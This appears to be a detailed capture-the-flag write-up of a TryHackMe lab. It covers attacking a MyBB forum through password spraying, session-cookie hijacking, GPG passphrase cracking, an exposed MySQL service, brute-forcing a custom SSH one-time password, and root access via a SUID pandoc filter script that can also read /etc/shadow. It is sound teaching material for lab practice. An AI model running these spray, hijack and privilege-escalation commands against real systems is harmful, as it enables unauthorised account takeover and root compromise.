---
description: "TryHackMe M4tr1x: Exit Denied — a MyBB forum that hands you the attack in its own bug-bounty page and then makes you earn every step of it. A 'disabled' HTML form still has a live server-side endpoint; a table of 55 mostly-decoy vulnerability reports repeats two real ones and publishes thirteen weak passwords; a password spray gets you a moderator, whose private messages name a directory holding an AES-256 GPG file. Cracking it with rockyou would take nine days — the room instead hides six Latin letters among Chinese characters on a page whose URL is written in binary, collapsing the keyspace to 1,956 permutations and 79 seconds. Then an exposed MySQL port, a Super Moderator's login key, four deleted threads, and a home-grown 'SSH-TOTP' that rewrites the SSH password every 60 seconds. Root is a SUID pandoc — used to run one command, not to overwrite /etc/passwd. Every command and flag explained for a total beginner, and twelve wrong turns kept in, including three broken measuring instruments that each reported a confident, wrong 'nothing there'."
---

# M4tr1x: Exit Denied — three broken instruments and a URL written in binary

**TryHackMe · challenge: M4tr1x: Exit Denied (`m4tr1xexitdenied`) · target: `10.x.x.x` (the lab IP changes per lease)**

> **Flags and credentials are redacted in this write-up.** Every command, payload, offset, dead end
> and piece of reasoning is here — those are what teach. The flag strings and recovered passwords
> teach nothing; they are just proof you were there, and publishing them hands the room's answers to
> the next person instead of letting them earn it.

**Answers:** user flag `fL4g{[redacted]}`, root flag `Flag{[redacted]}`, web flag `fL4g{[redacted]}` —
reached through a MyBB forum, an exposed MySQL port, a home-grown one-time-password scheme, and a
SUID copy of a document converter.

This is a long room and I got a lot wrong in it. Three separate times a measuring instrument I built
told me "there is nothing here" and was **wrong for a reason that had nothing to do with the target**.
All three are kept in below, because catching that class of mistake is worth more than the flags.

---

## Words you need before we start

If you have never done this before, these come up constantly.

- A **port** is a numbered door on a machine, 0–65535. A program that wants to be reachable over the
  network listens behind one. Port 80 is the usual door for websites, 22 for **SSH** (a remote
  command line), 3306 for **MySQL** (a database).
- **Enumeration** is the boring, systematic listing of everything a target exposes — ports, then
  services, then pages, then parameters. Most boxes are won here, not by a clever exploit.
- **MyBB** is a popular free forum written in PHP. Its admin area is called the **ACP**
  (Administration Control Panel).
- A **hash** is a one-way fingerprint of some data. **SHA-256** is one. You cannot reverse it; you can
  only guess an input and check whether its fingerprint matches.
- **SUID** ("set user ID") is a flag on a Linux program meaning *"run as the file's owner, not as the
  person who launched it"*. A SUID program owned by `root` runs with full administrator power no
  matter who starts it. That is normal for a handful of system tools and catastrophic for anything
  else.
- **Privilege escalation** ("privesc") is turning the limited account you landed on into `root`.
- **IDOR** (Insecure Direct Object Reference) is when an app addresses things by a guessable number —
  `?id=41`, `?aid=201` — and forgets to check whether *you* are allowed to see that one.

## The one habit this room rewards

Every time you build something that reports *"nothing found"*, put a **positive control** in it —
something you already know is there, which the tool must report. If the control does not come back,
the run is void and you throw the results away. It costs one extra line and it is the only thing
standing between you and a confident wrong answer.

I will point at it three times below. Each time it saved the engagement.

---

## 1. Recon

```bash
ping -c 3 10.x.x.x
```

`-c 3` sends three packets and stops. All three came back with **TTL 62**. TTL ("time to live") is a
counter that starts at a value the operating system picks and drops by one at every router. Linux
starts at 64, so 62 means *a Linux box, two hops away*. That is a free fingerprint before you have
sent a single real request.

```bash
nmap -p- -sT --min-rate 1000 -T4 -oN evidence/nmap-allports.txt 10.x.x.x
```

- `-p-` — scan **all 65535 ports**, not nmap's default top-1000. Rooms hide things on odd ports.
- `-sT` — a **full TCP connect scan**. The faster `-sS` half-open scan needs root privileges on *your*
  machine; check whether you have them before queueing a long job behind a privilege you do not have.
- `--min-rate 1000 -T4` — go reasonably fast. Not faster: a 1-vCPU lab VM falls over under heavy
  scanning and then you are debugging your own traffic.
- `-oN <file>` — write the output to a file immediately, so it survives.

```
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

65532 + 3 = 65535, which is its own quiet confirmation that the scan really covered everything.

`nmap -sV` on those three: OpenSSH 8.2p1 (Ubuntu 20.04), Apache 2.4.41, **MariaDB 10.3.39**.

**A database listening on the public interface is unusual** — MySQL is normally bound to localhost.
Note it and move on; it pays off in section 8.

## 2. The forum

```bash
curl -s http://10.x.x.x/ -o index.html
```

`-s` is "silent" (no progress bar) and `-o` writes to a file. Read the **response headers** before the
page:

```
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: mybb[lastvisit]=...
```

That `mybb[...]` cookie names the software: **MyBB**, version 1.8.23. The board is called *Linux-Bay*,
41 members, 108 posts, 49 threads, administrator **bigpaul**.

`/robots.txt` → 404, so no free list of interesting paths.

Guests can see nothing: every `forumdisplay.php?fid=N` and `showthread.php?tid=N` answers *"You are
either not logged in or do not have permission"*. So step one is to become a member.

### Registering (and MyBB fighting back twice)

MyBB's signup is a three-step form, and it rejected me twice:

1. *"Registration must take a minimum time of 15 seconds ... you registered in 3 seconds."* A bot
   check. Fixed with a `sleep 17`.
2. *"The answer you provided for the security question is wrong."* The question is **chosen at random
   per session** from a pool: *"Which animal is the Linux mascot?"*, *"Which famous Linux directory
   only temporarily stores files...?"*, *"Who is the principal developer of Linux?"*, and a
   count-the-files-in-this-`ls`-output one.

The fix is worth copying. Rather than guess the exact expected wording for four different questions,
**re-fetch the form until it serves the one question whose answer is certain**, then submit:

```bash
for try in $(seq 1 15); do
  curl -s -c "$jar" -d "action=register&step=agreement&agree=1" "$T/member.php" -o step2.html
  Q=$(extract_question step2.html)
  case "$Q" in *mascot*) A=penguin; break ;; esac
done
```

Fetching a form is cheap and read-only. Guessing answers is neither.

### The cookie *is* the account

Once logged in, look at what MyBB gave us:

```
mybbuser=42_TgN20ecIR5Xo0O8G…[redacted]
```

That is `<user id>_<login key>`. There is no separate server-side session to steal: **if you know a
user's uid and their 50-character `login_key`, you are that user.** Remember this. It is what the
entire middle of the room is about.

## 3. Following the white rabbit

With a member account, all 49 threads become readable. I pulled them all to one file and read them
offline. Thread **tid=25, "Bug Bounty Program"**, posted by the administrator:

> To participate all you need to do is ensure you report any minor weaknesses to the following page:
> **/bugbountyHQ**

`/bugbountyHQ` is a bug-report form. Every input on it carries `disabled="disabled"` and the page says
"Disabled: under maintenance". **`disabled` is a browser instruction, not a security control** — it
stops a form from being submitted by a human clicking buttons, and does nothing to the server. Read
what the form points at:

```html
<form method="post" action="/reportPanel.php">
```

**`/reportPanel.php`** — and it is very much alive.

## 4. The report panel is the whole attack, written down

`/reportPanel.php` renders a table of **55 submitted bug reports**. Most are genuine, unrelated MyBB
CVEs pasted in as noise — a haystack. The signal is **repetition**: the room says a thing several
times when it matters.

| Repeated theme | Times |
|---|---|
| a "PM vault" plugin, function `AR4`, XSS | 9 |
| an "IP history" plugin, unsanitised User-Agent → XSS in the ACP | 4 |
| a "mybb downloads" plugin, members can add files without approval | 4 |

And two rows marked **critical**, which turned out to be the actual path:

- *"your mybb login system is not using any 'captcha mechanism' or 'failed login timeout method' which
  makes it very vulnerable to password spray attacks"* — **followed by a list of thirteen weak
  passwords**.
- *"deleted mod posts with attachments can still be accessed ... aid indexes could be enumerated
  **using the hijacked account of the mod who deleted the post**"*.

Read together, those two rows are the plan: spray the published passwords, get a moderator, then use
the moderator to reach deleted content.

> Note the discipline here: three of the repeated themes are **decoys**. I later spent 63,000 requests
> fuzzing `/inc/plugins/` for those plugin names and found only MyBB's own bundled sample. The forum
> had already told me, in plain English, "Plugins disabled until further notice". Reading beats fuzzing.

## 5. Password spray — and the first broken instrument

Cost, multiplied out **before** launching, which is a rule worth keeping: 41 users × 13 passwords =
**533 requests**, about a minute. This is not "password cracking" in the sense that eats an afternoon;
it is a thirteen-word list the application itself published.

Success is detected **positively**: MyBB sets a `mybbuser` cookie only on a real login. "The error
string is absent" is true of every error page ever written, so never detect on absence.

Controls, printed above the results:

```
POSITIVE  my own account with its real password    -> must be a HIT
NEGATIVE  my own account with a wrong password     -> must be a miss
```

**The first run reported 0 hits out of 533 — and the positive control missed too.** The run was void.
The cause had nothing to do with the target: MyBB's login requires a per-session anti-CSRF token
called `my_post_key`, and without it every single POST answered *"Authorization code mismatch"*.

Sit with that for a second. Without the control, I would have written *"no valid credentials found"*
as a fact, and it would have been completely wrong. **This is the single most valuable habit in the
whole write-up.**

Fixed — fetch a fresh session and its token per attempt:

```bash
key=$(curl -s -c "$jar" "$T/member.php?action=login" | extract my_post_key)
curl -s -c "$jar" -b "$jar" \
     --data-urlencode "action=do_login" \
     --data-urlencode "my_post_key=$key" \
     --data-urlencode "username=$u" --data-urlencode "password=$p" \
     "$T/member.php" -o /dev/null
grep -q mybbuser "$jar" && echo HIT
```

Controls now read `POSITIVE -> HIT`, `NEGATIVE -> miss`. **15 accounts fell**, including **two
moderators**. The administrator, the super moderator, and a user called **Ellie** all held.

Because the cookie is `uid_loginkey`, every hit also hands over a reusable login key.

## 6. A moderator's inbox

As one of the moderators there is an unread private message. Walking every `pmid` for every hijacked
account (private messages are **not** an IDOR here — other people's are properly refused) produced the
conversation the room is built around:

> *"the new plugin ... will allow you and the other mods to migrate to standard accounts through
> mybb's **uid and login_key** concepts"*

> *"Hey, James, have you finished **version 3 of the mod manager plugin**"*

> *"I tried accessing **version 2 from /devBuilds**"*

And `/devBuilds/` has directory listing switched on:

```
modManagerv1.plugin   11 bytes   //obsolete
modManagerv2.plugin   5.6 K      <- the real source
modManagerv3.plugin   16 bytes   //unreleased...
p.txt.gpg             104 bytes
```

```bash
file p.txt.gpg
# GPG symmetrically encrypted data (AES256 cipher)
```

"Symmetrically encrypted" means it is locked with a **passphrase**, not a key file. And the plugin
source says exactly what is inside it:

```php
$sql_p = file_get_contents('inc/tools/manage/SQL/p.txt'); // read SQL password from p.txt
$db = mysql_connect('localhost','mod',$sql_p);
```

So `p.txt` holds the MySQL password for a database user called `mod` — and MySQL is reachable from
outside on port 3306. Decrypt the file, read the database.

### Two dead ends worth keeping

- I tried the thirteen published passwords directly against the GPG file. None worked. That is a
  30-second test with a huge payoff if it hits, so it is worth doing before anything expensive.
- I tried the same thirteen against MySQL and got **seventeen identical "TLS/SSL error" results**.
  Seventeen identical results that are all the *same error* is a **broken instrument, not seventeen
  wrong passwords** — Kali's MariaDB client demands TLS and this server does not offer it. Adding
  `--skip-ssl` turned them into real `Access denied` answers. Second broken instrument.

## 7. Nine days, or seventy-nine seconds

```bash
gpg2john p.txt.gpg > p.txt.gpg.hash
john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt p.txt.gpg.hash --max-run-time=40
```

`gpg2john` converts the encrypted file into a format John the Ripper can attack. I ran it for
**40 seconds just to read the speed**, which is a habit worth building:

```
Cost 1 (s2k-count) is 65011712 for all loaded hashes
0g 0:00:00:40 0.00% (ETA: 2026-09-18) 18.33c/s
```

**18 guesses per second.** That "s2k-count" is the number of bytes GPG re-hashes per attempt, and this
file uses the maximum. rockyou.txt has 14,344,392 lines:

```
14,344,392 ÷ 18.33 ≈ 782,000 seconds ≈ 9 days
```

So the passphrase is meant to be **found**, not brute-forced. That reframes the whole problem: stop
looking for a bigger wordlist, start looking for a way to make the keyspace small.

The room says so itself, in question 6: *"only the keymaker could help you crack it."*

## 8. The keymaker, and a URL written in binary

This is where I lost the most time, so here is the shape of it honestly.

I swept the web root with a **220,532-word** list (mixed case, destructive names like `install` and
`reset` stripped out first, because a content sweep issues real GET requests and those names are
*writes*). Two known directories went in as **positive controls** and one nonsense string as a
**negative control**. Both positives came back, the negative did not, and **nothing new appeared**.

That is a negative I can actually trust, and it is the only reason I stopped fuzzing instead of
reaching for a bigger list. A sweep without controls would have left me wondering forever.

The keymaker's page is not a word. Its path is **64 binary digits**:

```bash
python3 -c "b='01001011011001010111100101101101...'; \
            print(''.join(chr(int(b[i:i+8],2)) for i in range(0,len(b),8)))"
# -> Keymaker
```

`/0100101101100101…01110010` — 64 bits, 8 bytes, ASCII for **"Keymaker"**. The room's answer format
for that question is around sixty characters long, and I had spent an hour reading that as "a deep
filesystem path". **An answer-format length is a hint about encoding as much as about depth**: sixty
characters drawn from a two-symbol alphabet is eight bytes of text.

The page itself is a Matrix "digital rain" animation whose character set is Chinese — with six Latin
letters seeded into it, under a comment that tells you so:

```javascript
//keymaker: "English letters below"
var chinese = "诶比西迪伊吉艾杰开哦o屁西迪伊吉杰开哦艾杰开f哦屁q西屁西迪伊吉艾杰开哦x屁…"
```

Pulled out in order: **o f q x v g**.

Six letters. Every arrangement of them, lengths 1 to 6, is `6! + 6×5×4×3×2 + …` = **1,956 candidates**:

```bash
python3 -c "
from itertools import permutations
print('\n'.join(''.join(p) for n in range(1,7) for p in permutations('ofqxvg',n)))" > perms.txt
john --format=gpg --wordlist=perms.txt p.txt.gpg.hash
```

```
1g 0:00:01:19 DONE  18.28c/s
```

**79 seconds** at the exact same 18 guesses per second that made rockyou a nine-day job. The room was
never a cracking challenge; it was a keyspace-reduction challenge.

```bash
gpg --batch --pinentry-mode loopback --passphrase-fd 0 -d p.txt.gpg
# [redacted] //SQL Password
```

## 9. The database, and Ellie

```bash
mysql --skip-ssl -h 10.x.x.x -u mod -p'[redacted]' -e "select * from modManagerv2.members;"
```

The `mod` user can read exactly one table, and it is the "mod manager" table the private messages
described — usernames and **login keys**:

```
Ellie      G9KY2siJp9…[redacted]
BlackCat   JY1Avl8cqC…[redacted]
```

Ellie's login key is one of the room's questions. And because MyBB's cookie *is* `uid_loginkey`,
it is also a login — write `mybbuser=35_<Ellie's key>` into a cookie jar and you are Ellie, with no
password involved at all.

More usefully, that table also contains **BlackCat, a Super Moderator**.

## 10. What only a Super Moderator can see — and the third broken instrument

Earlier I had walked `forumdisplay.php?fid=1..45` and found **three forums the index never links**:
"future plans", "scheduled updates", "security issues". As a normal moderator, "future plans" showed
only rows reading *"Deleted Thread"* — no titles, no links, no thread ids. `showthread.php` on the
likely ids answered *"the specified thread does not exist"*.

As **BlackCat**, the same page shows the threads themselves, with attachments:

| thread | attachment |
|---|---|
| p | **SSH-TOTP documentation.pdf** |
| g / p | High- and Low-Level SSH-TOTP diagrams (PNG) |
| pp | **Releases.txt** |
| ppp | **DevTools.zip** |
| ooo | hardwareToken.jpg |
| "accidental remove" ×3 | **testing.zip** |

The lesson: **when a permission wall blocks content, try the identical request as a
higher-privileged account before inventing a bypass.** I had the Super Moderator's key in hand for
several minutes before it occurred to me to re-run the request with it.

And here is the third broken instrument. Much earlier I had swept attachment ids `aid=1..200` — as a
plain member *and* as both moderators — found 25 ordinary images, and written off that entire lead.
These attachments are **aid 201 through 766**. My negative was bounded by *my own range*, not by the
target. "No attachments" was never true; "no attachments below aid 200" was, and that is what I
should have written down.

## 11. SSH-TOTP: rebuilding the password generator

The recovered documents describe a home-grown one-time-password scheme, and between them they give
the whole algorithm.

From the PDF and the low-level diagram:

1. Take **three** of five simulated "country times". Each is `now + offset` formatted as
   day-hour-minute — the 24th at 13:35 becomes `241335`.
   The offsets, from the bundled `timeSimulatorClient.py`: Ukraine +4:43, Germany +13:55,
   England +9:19, Nigeria +1:06, Denmark −5:18.
2. Multiply them: `CTT = CA × CB × CC`.
3. XOR with a **shared secret token** burned into a hardware key: `UC = CTT ⊕ SST`.
4. Hash it: `HC = sha256(str(UC))`.
5. Truncate: `OTP = HC[22:44]` — 22 characters, matching the diagram's worked example.
6. **Every 60 seconds the service rewrites the SSH account's password to the current OTP.**

`Releases.txt` adds the detail that the developer *"randomly selected 3 sources of time"*, and
`testing.png` supplies the username — **`architect`** — and three candidate shared secret tokens.

So two things are unknown: which three of five countries (`C(5,3)` = 10) and which of three tokens.
**30 candidates per minute.**

```python
def otp(base, trio, sst):
    ctt = 1
    for name in trio:
        h, m = COUNTRIES[name]
        ctt *= int((base + timedelta(hours=h, minutes=m)).strftime("%d%H%M"))
    return sha256(repr(ctt ^ sst).encode()).hexdigest()[22:44]
```

**My first attack run was worthless, and the clock is what told me.** Thirty sequential SSH attempts
took **82 seconds** — against a password that changes every **60**. The answer rotated underneath the
run, so a miss meant nothing at all. Running the attempts ten at a time brought a pass down to
7 seconds:

```bash
xargs -a otps.txt -d'\n' -I{} -P 10 bash -c 'try_one "$@"' _ {}
```

```
SUCCESS  (Ukraine + Nigeria + Denmark, third token)
uid=1000(architect) ... groups=...,27(sudo),...
```

**Multiply out a timing attack against the target's clock, not just against wall time.**

The user flag is in `architect`'s home directory: `fL4g{[redacted]}`.

(After getting root I read the real generator at `/root/SSH-TOTP-timeSimulator.py`. Same three
countries, same token, same `[22:44]` slice — the reconstruction was exactly right.)

## 12. architect to root

`architect` is in the `sudo` group, and the current OTP is **accepted** as the sudo password — but:

```
Sorry, user architect may not run sudo on this host.
```

Worth reading carefully: that is an **authorisation** refusal, not an **authentication** one. It tells
you the password was right and there is simply no rule for this user. Different message, different
meaning, different next step.

The real finding is in the SUID list:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`-perm -4000` matches the SUID bit; `-type f` restricts to regular files; `2>/dev/null` throws away
the permission-denied noise (only safe here because the command is already known to work).

```
-rwsr-sr-x 1 root root 80908912 /usr/bin/pandoc
```

**`pandoc` — a document format converter — is SUID root.** Nothing legitimate needs that. Two
capabilities follow, and GTFOBins lists the first:

**Arbitrary file read.** Always run a control first — a file you can already read — so that a failure
later is unambiguous:

```bash
pandoc -f rst -t plain /home/architect/user.txt   # control: works
pandoc -f rst -t plain /etc/shadow                # root-only: also works
pandoc -f rst -t plain /root/.mysql_history       # -> the forum's own DB credentials
```

> Use `-f rst`, not `-f markdown`. The markdown reader treats a backslash as an escape character and
> **silently ate one out of the user flag**. The room's own answer format contains a literal `\/`,
> which is what gave it away. *Pick the decoder that does not transform the bytes.*

**Arbitrary command execution.** pandoc runs `--filter` programs as child processes, and a SUID parent
hands its privileges to them:

```bash
printf '#!/bin/bash -p\nid > /tmp/rootout.txt\n' > /tmp/rootcmd
chmod +x /tmp/rootcmd
echo hi | pandoc -f markdown -t plain --filter /tmp/rootcmd
cat /tmp/rootout.txt
# uid=1000(architect) euid=0(root) egid=0(root)
```

`#!/bin/bash -p` is not optional — plain bash deliberately drops the elevated effective uid on
startup, and `-p` is what preserves it.

> The published write-ups for this room take a different route: read `/etc/passwd`, append a new
> uid-0 user, and overwrite the file with pandoc. That works, but it rewrites a file the system
> cannot boot without, and it leaves an account behind. The `--filter` route runs **one command** and
> modifies nothing; both temporary files were deleted afterwards and the deletion verified.

### The remaining answers

- `/var/www/html/inc/config.php` holds `$config['secret_pin']` — the ACP pin, `[redacted]`.
- Dumping the forum database and grepping it turns up a `mybb_datacache` row called `adminnotes`
  containing a note to change a password — **and the web flag**. It renders on the ACP dashboard once
  you log in as the administrator with that password plus the pin. (I confirmed the password by
  recomputing MyBB's `md5(md5(salt) + md5(password))` against his stored hash rather than just
  assuming.)

### The root flag, and my own fourth broken instrument

There is **no flag file in `/root`** — just dotfiles and the timeSimulator script.

So I grepped the whole filesystem for `(fL4g|fl4g|flag|THM)\{...\}` and got back only the two flags I
already had. **That negative was wrong, and wrong because of my own pattern**: the file writes
`Flag{` with a capital F, and my alternation was case-sensitive. *Name the assumption baked into a
probe before you believe its negative* — here, the case of four letters.

The flag lives in a file that is **world-readable the whole time**:

```
-rw-r--r-- 1 root root 551 /etc/-- -root.py
```

It was never protected by permissions. It is hidden by a **filename that breaks shell argument
parsing**: `cat /etc/-- -root.py` makes `cat` read `--` as "end of options" and then look for a file
literally called ` -root.py`. Quoting the path is the entire trick.

And the flag is **computed**, not stored:

```python
key = 82
flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
print('\nFlag{[redacted]' + str(flag) + '[redacted]}')
```

The lesson buried in that line is **Python operator precedence**: `*`, `-` and `+` all bind tighter
than `^`, so the expression is *not* evaluated left to right as it reads. It is
`9087 ^ 75 ^ 90 ^ 175 ^ (52×13×19 − 18×2 + 82)`. Work it out in the wrong order and you get a
plausible-looking number that is simply not the flag.

---

## Every wrong turn, in one table

| # | Symptom | Real cause | The rule |
|---|---|---|---|
| 1 | Planned around phpBB before scanning | phpBB and MyBB both call it the "ACP"; I picked one from memory | A vocabulary match narrows the field; it does not identify the product. One response header settled it. |
| 2 | Spray: 0 hits from 533 attempts | Every POST lacked MyBB's per-session `my_post_key` | **The positive control is the only reason this was caught.** Otherwise "no valid credentials" ships as fact. |
| 3 | First message dump: 0 messages | A shell field-splitting bug in my own script | The control said 0, so the run was declared void rather than read. |
| 4 | Second dump missed 6 messages | I trusted the message **folder listing** to enumerate ids | A listing proves presence, never absence. Walk the id range instead. |
| 5 | Third dump: 0 again | My detector matched markup that did not exist | Detect on something you have actually seen in the file. |
| 6 | "No hidden attachments" after `aid=1..200` | The real ones are aid **201–766** | A range is an assumption. Write down what you measured: "none below 200". |
| 7 | 63,000 requests fuzzing for plugins | The plugins were never installed | The forum announcement said so in plain English. Reading beats fuzzing. |
| 8 | 17 identical MySQL failures | The client demanded TLS the server does not offer | Identical errors on every candidate = broken instrument, not 17 wrong answers. |
| 9 | First SSH-TOTP pass: 30 misses | 82 seconds sequential against a 60-second password | Multiply out the cost against the **target's** clock. |
| 10 | Teardown check said "2 running" for tools I never launched | My `grep` was matching its own command line in `ps` | A uniform result across categories that cannot all be true is a broken discriminator. `pgrep -x` gave 0. |
| 11 | Filesystem flag grep "found nothing new" | My alternation was case-sensitive; the file writes `Flag{` | Name the probe's assumptions before believing its negative. |
| 12 | Hunted a deep filesystem path for an hour | The ~60-character answer was 64 **binary digits** | Read an answer-format length as a hint about **encoding**, not only depth. |

And the two things that went right, which are the same habit twice:

- The 220,532-word sweep carried two positive controls and a negative control, so its "nothing here"
  was **trustworthy** — the only reason I stopped fuzzing and started thinking.
- Benchmarking the cracker for 40 seconds and doing the arithmetic (18.33 c/s × 14.3 M ≈ 9 days)
  killed a run that could never have finished and reframed the puzzle correctly.

## Cleaning up after yourself

Everything started gets stopped, and stopping is a claim that needs evidence:

- The forum account I registered was **deleted** through the ACP; verified by querying the user table
  (0 rows) and the member count returning to its original value.
- Both temporary files on the target were removed; verified with `ls` returning "No such file".
- A root-owned `grep` I launched on the box was killed **by PID** and verified with a process count of
  zero. (`pkill -f` fails silently and should not be trusted for this.)
- The admin panel session was logged out; verified by re-fetching the page and getting the login form.
- Scanners and crackers on my own machine: verified stopped with `pgrep -x`, not with "the command
  exited".

Nothing was uploaded to the target — no web shell, no SSH key, no cron entry, no `/etc/passwd` edit.
